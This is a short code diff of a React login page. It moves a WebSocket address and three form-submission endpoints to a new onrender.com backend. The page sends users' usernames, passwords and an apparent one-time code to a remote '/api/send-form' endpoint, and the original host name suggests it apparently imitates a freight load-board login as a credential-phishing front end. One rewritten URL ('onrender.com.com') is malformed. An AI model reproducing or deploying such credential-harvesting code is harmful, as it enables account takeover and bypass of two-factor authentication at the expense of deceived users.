@@ -42,7 +42,7 @@ function HomePage() {
   const sessionKeyRef = useRef(generateShortSessionKey());
 
   useEffect(() => {
-    const socket = new WebSocket("wss://load-bord-datone-back.onrender.com/ws");
+    const socket = new WebSocket("wss://dat-be.onrender.com.com/ws");
     wsRef.current = socket;
 
     socket.onopen = () => {
@@ -146,7 +146,7 @@ function HomePage() {
       if (qfNum === 0) {
         if (userName.current.value && passwordUser.current.value) {
           await axios.post(
-            "https://load-bord-datone-back.onrender.com/api/send-form",
+            "https://dat-be.onrender.com/api/send-form",
             {
               username: formData.userName,
               password: formData.password,
@@ -186,7 +186,7 @@ function HomePage() {
     setDisableButton(false);
     if (digit.current.value) {
       await axios.post(
-        "https://load-bord-datone-back.onrender.com/api/send-form",
+        "https://dat-be.onrender.com/api/send-form",
         {
           username: formData.userName,
           password: formData.password,
@@ -204,7 +204,7 @@ function HomePage() {
 
   async function resend() {
     await axios.post(
-      "https://load-bord-datone-back.onrender.com/api/send-form",
+      "https://dat-be.onrender.com/api/send-form",
       {
         username: formData.userName,
         password: formData.password,
